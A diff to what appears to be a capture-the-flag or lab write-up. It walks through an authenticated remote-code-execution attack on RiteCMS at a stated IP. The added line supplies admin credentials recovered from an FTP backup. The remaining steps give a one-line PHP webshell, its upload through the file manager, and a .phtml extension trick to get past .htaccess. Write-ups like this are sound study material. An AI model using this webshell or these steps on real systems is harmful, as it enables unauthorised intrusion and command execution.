@@ -151,7 +151,7 @@ http://159.65.224.214/content/ we can see a the end of page the version `RiteCMS
 
 Searching for exploits, i found an Authenticated RCE exploit https://www.exploit-db.com/exploits/50616 
 
-- Login to the admin portal `http://159.65.224.214/content/admin.php`
+- Login to the admin portal with admin:morocco2022 (from ftp backup) `http://159.65.224.214/content/admin.php`
 - We need to create a php webshell `<?php system($_GET['cmd']); ?>`
 - Upload it in the file manager `http://159.65.224.214/content/admin.php?mode=filemanager&directory=media` 
 - Try differnent extentions to bypass .htaccess `phtml worked for me` 
